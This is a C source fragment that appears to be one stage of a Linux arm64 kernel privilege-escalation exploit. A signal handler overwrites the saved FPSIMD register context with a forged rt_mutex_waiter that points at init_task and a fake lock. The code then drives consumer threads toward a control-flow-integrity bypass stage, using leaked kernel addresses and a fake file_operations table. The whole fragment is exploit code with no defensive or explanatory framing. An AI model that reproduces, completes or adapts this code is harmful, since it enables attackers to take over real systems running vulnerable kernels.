
/* === SIGRETURN FPSIMD ROUTE === */


#include <signal.h>
#include <asm/sigcontext.h>

static volatile int sigreturn_done = 0;
static uint8_t g_fake_waiter[0x58];

static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
    (void)sig; (void)info;
    ucontext_t *uc = (ucontext_t *)ucontext;
    mcontext_t *mc = &uc->uc_mcontext;
    unsigned char *base = (unsigned char *)mc;

    for (int off = 0; off < 1024; off += 8) {
        uint32_t magic = *(uint32_t *)(base + off);
        if (magic == FPSIMD_MAGIC) {
            struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
            uint8_t *vregs = (uint8_t *)&fpsimd->vregs[0];
            memcpy(vregs + 0x18, g_fake_waiter, 0x58);
            sigreturn_done = 1;
            return;
        }
    }
}

void do_sigreturn_fake_lock_route(void) {
    if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 30;
        cfi_last_errno = 0;
        pr_error("sigreturn route missing kernel page base=%016zx lock=%016zx fops=%016zx\\n",
                 page_base, fake_lock, fake_fops);
        return;
    }

    int route_verified = 0;
    int calls = 0;
    int success = 0;

    /* Build fake rt_mutex_waiter (0x58 bytes) at FPSIMD copy offset 0x18 */
    memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
    uint64_t val;

    val = fake_w0;
    memcpy(g_fake_waiter + 0x00, &val, sizeof(val));   /* list.next / rb_parent_color */
    val = 0;
    memcpy(g_fake_waiter + 0x08, &val, sizeof(val));   /* list.prev */
    memcpy(g_fake_waiter + 0x10, &val, sizeof(val));   /* rb_parent_color = black, no parent */
    memcpy(g_fake_waiter + 0x18, &val, sizeof(val));   /* rb_right = NULL */
    memcpy(g_fake_waiter + 0x20, &val, sizeof(val));   /* rb_left = NULL */
    val = text_addr(INIT_TASK);
    memcpy(g_fake_waiter + 0x28, &val, sizeof(val));   /* task */
    val = fake_lock;
    memcpy(g_fake_waiter + 0x30, &val, sizeof(val));   /* lock */
    val = 3;
    memcpy(g_fake_waiter + 0x38, &val, sizeof(val));   /* prio */
    /* 0x40-0x57: ww_ctx + padding = zero */

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigreturn_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);

    int tid = atomic_load(&waiter_tid);
    if (tid <= 0) {
        cfi_last_step = 31;
        cfi_last_errno = 0;
        pr_error("sigreturn route no waiter tid\\n");
        return;
    }

    sigreturn_done = 0;
    syscall(SYS_tgkill, getpid(), tid, SIGUSR1);

    while (!sigreturn_done) {
        sched_yield();
    }

    atomic_store(&punch_consume_go, 1);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);

    int waited = 0;
    while (waited < 500000) {
        calls = atomic_load(&consumer_calls);
        success = atomic_load(&consumer_success);
        if (calls > 0 && success > 0) {
            if (try_cfi_stage()) {
                cfi_last_step = 0;
                route_verified = 1;
            } else if (!cfi_last_step) {
                cfi_last_step = 32;
            }
            break;
        }
        if (cfi_dirty_seen) {
            break;
        }
        usleep(1000);
        waited += 1000;
    }

    atomic_store(&punch_consume_go, 0);

    pr_info("sigreturn route done=%d calls=%d success=%d step=%d errno=%d\\n",
            route_verified, calls, success, cfi_last_step, cfi_last_errno);
}
